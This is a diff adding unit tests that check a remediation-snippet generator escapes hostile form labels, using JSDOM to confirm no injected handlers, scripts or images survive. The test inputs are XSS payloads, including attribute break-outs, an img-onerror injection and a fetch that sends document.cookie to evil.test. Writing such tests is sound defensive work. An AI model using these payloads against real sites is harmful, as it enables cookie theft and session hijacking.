@@ -129,6 +129,81 @@ describe('generateRemediation — syntax correctness', () => {
     }
   });
 
+  it('cannot be made to emit a rogue attribute from a hostile label', () => {
+    // Every one of these closes an attribute in some quoting context. The
+    // generated snippet is code a developer pastes into their own site, so a
+    // break-out here is stored XSS delivered through remediation advice.
+    const payloads = [
+      `x' onfocus='alert(document.cookie)' autofocus x`,
+      `x" onmouseover="alert(1)" x`,
+      `x'/><script>alert(1)</script><input a='`,
+      `x"><img src=x onerror=alert(1)>`,
+      `x' onload='fetch("//evil.test?c="+document.cookie)`,
+    ];
+
+    for (const payload of payloads) {
+      const hostile = makeForm({
+        id: 'form-evil',
+        category: 'checkout',
+        selector: 'form#evil',
+        name: payload,
+        fields: [makeField({ name: 'msg', accessibleName: payload })],
+      });
+      const data = { ...fixture.data, forms: [hostile, ...fixture.data.forms] };
+      const issue: AuditIssue = {
+        ...fixture.scorecard.issues[0],
+        id: 'actionability.uncovered-checkout-form-evil',
+        evidence: { formId: 'form-evil' },
+        relatedSelectors: ['form#evil'],
+      };
+
+      const html = generateRemediation(issue, data).tabs[2].code;
+      const dom = new JSDOM(`<body>${html}</body>`);
+      const document = dom.window.document;
+
+      // No element anywhere in the parsed output may carry an event handler,
+      // autofocus, or an injected script/image tag.
+      for (const element of Array.from(document.querySelectorAll('*'))) {
+        const rogue = Array.from(element.attributes)
+          .map((attribute) => attribute.name)
+          .filter((name) => name.startsWith('on') || name === 'autofocus' || name === 'onerror');
+        expect(rogue, `${payload} -> <${element.tagName.toLowerCase()}>`).toEqual([]);
+      }
+      expect(document.querySelector('script'), payload).toBeNull();
+      expect(document.querySelector('img'), payload).toBeNull();
+
+      // The snippet is still a usable form — the payload was escaped, not
+      // stripped, so the developer can see what their page is actually serving.
+      const form = document.querySelector('form[data-mcp-tool]');
+      expect(form, payload).not.toBeNull();
+    }
+  });
+
+  it('keeps the schema attribute parseable when the label contains both quotes', () => {
+    const hostile = makeForm({
+      id: 'form-q',
+      category: 'checkout',
+      selector: 'form#q',
+      fields: [makeField({ name: 'msg', accessibleName: `it's a "quoted" label & <tag>` })],
+    });
+    const data = { ...fixture.data, forms: [hostile, ...fixture.data.forms] };
+    const issue: AuditIssue = {
+      ...fixture.scorecard.issues[0],
+      id: 'actionability.uncovered-checkout-form-q',
+      evidence: { formId: 'form-q' },
+      relatedSelectors: ['form#q'],
+    };
+
+    const html = generateRemediation(issue, data).tabs[2].code;
+    const form = new JSDOM(`<body>${html}</body>`).window.document.querySelector('form[data-mcp-tool]');
+
+    expect(form).not.toBeNull();
+    // The browser un-escapes on parse, so the round-trip must yield valid JSON
+    // with the original label intact.
+    const schema = JSON.parse(form!.getAttribute('data-mcp-schema') ?? '{}');
+    expect(schema.properties.msg.description).toBe(`it's a "quoted" label & <tag>.`);
+  });
+
   it('escapes values that would break out of generated syntax', () => {
     const hostile = makeForm({
       id: 'form-9',
